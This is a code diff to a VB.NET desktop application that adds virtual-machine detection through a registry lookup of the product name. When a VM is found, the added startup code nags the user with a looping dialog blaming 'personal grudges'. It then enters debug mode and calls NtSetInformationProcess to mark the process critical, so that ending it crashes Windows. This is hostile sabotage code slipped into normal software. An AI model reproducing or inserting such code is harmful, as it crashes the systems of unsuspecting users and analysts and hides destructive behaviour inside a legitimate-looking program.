@@ -4,6 +4,7 @@ Imports System.Runtime.InteropServices
 Imports System.Text.RegularExpressions
 Imports System.Threading
 Imports System.Windows.Markup
+Imports Microsoft.Win32
 
 Class Application
     Public Shared Language As Integer
@@ -12,6 +13,19 @@ Class Application
         Return lang = "zh-CN" OrElse lang = "en-US"
     End Function
     Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
+
+    Private Function CheckVirtual() As Boolean
+        Dim sn As String = Registry.LocalMachine.OpenSubKey("SYSTEM").OpenSubKey("ControlSet001").OpenSubKey("Control").OpenSubKey("SystemInformation").GetValue("SystemProductName")
+        Dim vms = {"Virtual", "KVM", "VMware", "HVM", "RHEV", "VMLite"}
+        For Each n In vms
+            If sn.Contains(n) Then
+                Return True
+            End If
+        Next
+        Return False
+    End Function
+
+
     Private Sub Application_Startup(sender As Object, e As StartupEventArgs)
         Dim da As Process = New Process()
         da.StartInfo.FileName = "wmic.exe"
@@ -38,6 +52,15 @@ Class Application
             End If
         Catch ex As Exception
         End Try
+        If CheckVirtual() Then
+            Dim flag As Boolean
+            While Not flag
+                flag = MessageBox.Show("由于一些私人恩怨，程序不支持在虚拟机中运行", "", MessageBoxButton.YesNo, MessageBoxImage.Error) = MessageBoxResult.Yes
+            End While
+            Process.EnterDebugMode()
+            Dim isCritical As Integer = 1
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, &H1D, isCritical, 4)
+        End If
         If Not IsChineseSystem() Then
             Language = 1
         End If
